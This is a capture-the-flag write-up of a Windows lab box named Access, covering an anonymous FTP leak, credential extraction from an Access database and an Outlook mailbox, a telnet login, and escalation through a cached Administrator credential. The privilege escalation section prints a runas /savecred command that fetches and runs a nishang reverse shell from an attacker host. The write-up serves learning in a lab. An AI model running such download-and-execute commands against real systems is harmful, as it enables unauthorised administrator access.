# Access — Easy — Windows

**Date:** 20 - August - 2026

---
## Tags

`#windows` `#ftp` `#telnet` `#mdb` `#pst` `#mdbtools` `#readpst` `#cached-credentials` `#runas` `#savecred` `#privesc`

---

## What I Know

| Item       | Detail                                                                                   |
| ---------- | ---------------------------------------------------------------------------------------- |
| Target     | 10.129.51.200 (host: ACCESS)                                                              |
| OS         | Windows (6.1.7600, Server 2008 R2 era)                                                    |
| Open ports | 21, 23, 80                                                                                |
| Services   | Microsoft ftpd (21, anonymous); Windows telnetd (23); IIS 7.5 (80)                        |
| Foothold   | Anon FTP: backup.mdb + Access Control.zip, cred relay to telnet as `security`             |
| User       | `security` via telnet (password from a .pst email) -> user.txt                            |
| Privesc    | `.lnk` referencing runas + cached Administrator cred (cmdkey) -> `runas /savecred`         |
| Flags      | user.txt as security; root.txt as Administrator                                           |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.51.200
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-22 13:11 +0100
Nmap scan report for 10.129.51.200
Host is up (0.018s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 44.57 seconds
```

<img width="844" height="324" alt="image" src="https://github.com/user-attachments/assets/0c771e01-fba7-4c37-8be2-587ba2c36879" />

```
nmap -sC -sV -p21,23,80 10.129.51.200
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-22 13:13 +0100
Nmap scan report for 10.129.51.200
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 12.64 seconds
```

<img width="1256" height="747" alt="image" src="https://github.com/user-attachments/assets/2a6a6a88-df24-4e4d-9fb1-5ba938ea71d9" />

**What each port tells me:**
- **Port 21 (FTP)** — Microsoft ftpd with anonymous login allowed. Worth investigating first, since it may expose files directly.
- **Port 23 (telnet)** — Windows telnetd, a direct interactive login to the host. No creds yet, so set it aside until I find some (likely from the FTP files).
- **Port 80 (HTTP)** — IIS 7.5 serving a "MegaCorp" site. A web surface worth a quick look.

---
## Enumeration Log

```
OBSERVATION:
- Port 21 is open with anonymous login allowed
- Port 23 is telnet, a login route to the server
- There is a web application on port 80
WHAT IT TELLS ME:
- I can browse the FTP share with no password
- Telnet needs credentials I don't have yet
- Investigate the web app on port 80
WHAT I AM GOING TO TRY:
- Log in anonymously to FTP and explore
- Set telnet aside until I have creds
- Investigate port 80 (dir-fuzz, stack, source review)
WHY:
- Anonymous FTP often leaks sensitive files
- Telnet is useless without creds for now
- Understand the web app and check for disclosed info
RESULT:
- FTP held two folders (Backups and Engineer) with one file each: backup.mdb and
  "Access Control.zip". Downloaded both (use binary mode; the .mdb can arrive corrupted in
  ASCII mode)
- Port 80 is a single-page site with no real functionality; nothing from stack/source/dir-fuzz
WHAT NEXT:
- Analyse the two downloaded files
```

<img width="2519" height="1161" alt="image" src="https://github.com/user-attachments/assets/712a63c0-1750-4142-acc4-67b2af9f42c3" />

<img width="2558" height="827" alt="image" src="https://github.com/user-attachments/assets/ccf79701-27ec-415c-a965-6c9b289daaac" />

```
OBSERVATION:
- backup.mdb is a legacy Microsoft Access database; Access Control.zip contains a .pst
  (Outlook mailbox), but the zip is password-protected
WHAT IT TELLS ME:
- Read the .mdb for creds, use them on the zip, then read the .pst for more creds
WHAT I AM GOING TO TRY:
- Use mdbtools to enumerate/dump the database; crack open the zip; read the pst
WHY:
- These file types commonly hold credentials, and nothing else has panned out
RESULT:
- mdb: listed tables with mdb-tables, then dumped the interesting one with
  mdb-export backup.mdb auth_user. It held several accounts; the "engineer" entry had a
  strong password: access4u@security
- zip: plain unzip silently failed (didn't prompt), but 7z e "Access Control.zip" prompted
  and the engineer password access4u@security extracted it -> a .pst file
- pst: readpst converted it to a .mbox I could read. An email states the "security" account
  password was changed to 4Cc3ssC0ntr0ller
- Used security:4Cc3ssC0ntr0ller to log into telnet (port 23) and read user.txt
WHAT NEXT:
- Enumerate the system for a privesc path
```

<img width="1096" height="116" alt="image" src="https://github.com/user-attachments/assets/5db02e65-8131-49c0-82a2-e994a0d3ebf1" />

<img width="960" height="150" alt="image" src="https://github.com/user-attachments/assets/536c5af4-dcc8-4099-af89-f3f72f73b40a" />

<img width="2532" height="297" alt="image" src="https://github.com/user-attachments/assets/a9863c9f-3833-4396-805f-24576c13517c" />

<img width="1507" height="151" alt="image" src="https://github.com/user-attachments/assets/44d00c61-57da-4708-94d0-a80fe0df29ee" />

<img width="993" height="568" alt="image" src="https://github.com/user-attachments/assets/37577576-41c5-43b2-9d5e-30960a61a818" />

<img width="1588" height="132" alt="image" src="https://github.com/user-attachments/assets/0d5d6d4b-367a-4d9a-a4b6-f9040bbcaf65" />

<img width="2437" height="248" alt="image" src="https://github.com/user-attachments/assets/7dfb6cda-68b4-4cd8-9728-bd168baa1543" />

<img width="914" height="724" alt="image" src="https://github.com/user-attachments/assets/9234a2b7-8f3b-4512-ad7f-149be23eff21" />

<img width="657" height="237" alt="image" src="https://github.com/user-attachments/assets/50bf35b5-b6e1-4650-857f-f6d5d5cd044e" />


```
OBSERVATION:
- Enumerating the filesystem, the Public user's Desktop wasn't shown by a normal dir, but a
  forced listing (dir /a or ls -force in PS) revealed it
WHAT IT TELLS ME:
- Investigate the hidden Public desktop contents
WHAT I AM GOING TO TRY:
- List and read what's there
WHY:
- Hidden items on a shared desktop are suspicious and often the intended lead
RESULT:
- Found a shortcut "ZKAccess3.5 Security System.lnk". Reading it (type) shows it invokes
  runas, which hints that an Administrator credential may be reusable on this host
- Checked cmdkey /list: the system has a STORED Administrator credential
  (Domain:interactive=ACCESS\Administrator). So runas with /savecred will run commands as
  Administrator WITHOUT needing the plaintext password
- Hosted nishang Invoke-PowerShellTcp.ps1 (with my reverse-shell one-liner appended) on my
  box, then used runas /savecred to download and execute it
- Caught a reverse shell as Administrator and read root.txt
```

<img width="858" height="364" alt="image" src="https://github.com/user-attachments/assets/1b2833ed-e809-4d24-93eb-095d57c87c8a" />

<img width="1371" height="1010" alt="image" src="https://github.com/user-attachments/assets/b733ce1c-bed5-4578-9c64-669f74d6bca5" />

<img width="1090" height="257" alt="image" src="https://github.com/user-attachments/assets/f903a6aa-3e99-41ac-ba15-08035ad8bad5" />

<img width="1365" height="97" alt="image" src="https://github.com/user-attachments/assets/fe8cd930-6f12-4aa0-8d26-ecb9a0934db8" />

<img width="2189" height="66" alt="image" src="https://github.com/user-attachments/assets/2bec4044-ad6c-45cb-b6b0-6ee2a0db6644" />

<img width="1417" height="187" alt="image" src="https://github.com/user-attachments/assets/13f0170c-7c03-4f4e-b793-b381dd96eac3" />

<img width="863" height="570" alt="image" src="https://github.com/user-attachments/assets/7c7e84e4-b365-4f8f-b670-642ed53050b1" />

---

## Foothold

**How I got in:** Anonymous FTP exposed `backup.mdb` (a Microsoft Access database) and a password-protected `Access Control.zip`. Using mdbtools, I dumped the `auth_user` table (`mdb-export backup.mdb auth_user`) and recovered the `engineer` password `access4u@security`. That password opened the zip (with `7z`, since plain `unzip` fails on it), which contained an Outlook `.pst`. Reading the pst with `readpst` revealed an email stating the `security` account's password was changed to `4Cc3ssC0ntr0ller`. Those credentials logged into **telnet** as `security` for user.txt.

**Command / exploit used:**

```
# anonymous FTP (binary mode so the .mdb isn't corrupted)
ftp 10.129.51.200        # user: anonymous
ftp> binary
ftp> get backup.mdb
ftp> get "Access Control.zip"

# read the Access DB
mdb-tables backup.mdb
mdb-export backup.mdb auth_user        # -> engineer : access4u@security

# open the zip (7z, not unzip) and read the mailbox
7z e "Access Control.zip"              # password: access4u@security
readpst "Access Control.pst"           # -> security : 4Cc3ssC0ntr0ller

# log in over telnet
telnet 10.129.51.200                   # security : 4Cc3ssC0ntr0ller -> user.txt
```

**Why it worked:** The FTP server allowed anonymous access to files that should never have been exposed, and those files formed a credential relay: a database password unlocked an archive, whose email disclosed the next account's password. Reusing secrets that were casually left in a backup database and an internal email is the whole foothold, no exploit needed, just following the chain of leaked credentials into a working telnet login.

---

## Privilege Escalation

**Path taken (security -> Administrator):** On the Public user's Desktop (hidden from a normal `dir`, visible with `dir /a`) was a shortcut, `ZKAccess3.5 Security System.lnk`, that invoked `runas`. Checking `cmdkey /list` showed the host stores an Administrator credential (`Domain:interactive=ACCESS\Administrator`). Because a saved credential exists, `runas /user:ACCESS\Administrator /savecred "<command>"` executes as Administrator without prompting for a password. I hosted a nishang `Invoke-PowerShellTcp.ps1` reverse shell and used that runas to fetch and run it, landing a shell as Administrator for root.txt.

**Command / exploit used:**

```
# confirm the stored credential
cmdkey /list        # -> ACCESS\Administrator (Domain Password)

# run a payload as Administrator using the saved cred (no password needed)
runas /user:ACCESS\Administrator /savecred "cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
# -> reverse shell as ACCESS\Administrator -> root.txt
```

**Why it worked:** Someone configured the ZKAccess shortcut to launch as Administrator via `runas /savecred`, which caches the Administrator credential in the current user's Windows Credential Manager (DPAPI-protected). Once a credential is saved with `/savecred`, any process that user runs can reuse it with `runas` to execute arbitrary commands as Administrator, with no password required. The escalation is therefore credential reuse of a cached admin credential, not a software exploit, which is exactly the "gaping hole" `/savecred` is warned about.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Pulled a backup .mdb and a protected .zip from anonymous FTP, relayed creds (mdbtools -> zip -> readpst email) to recover the `security` account password, and logged into telnet.
2. **Privesc technique in one sentence:** Found a runas-based shortcut and a cached Administrator credential via `cmdkey /list`, then used `runas /savecred` to run a reverse shell as Administrator.
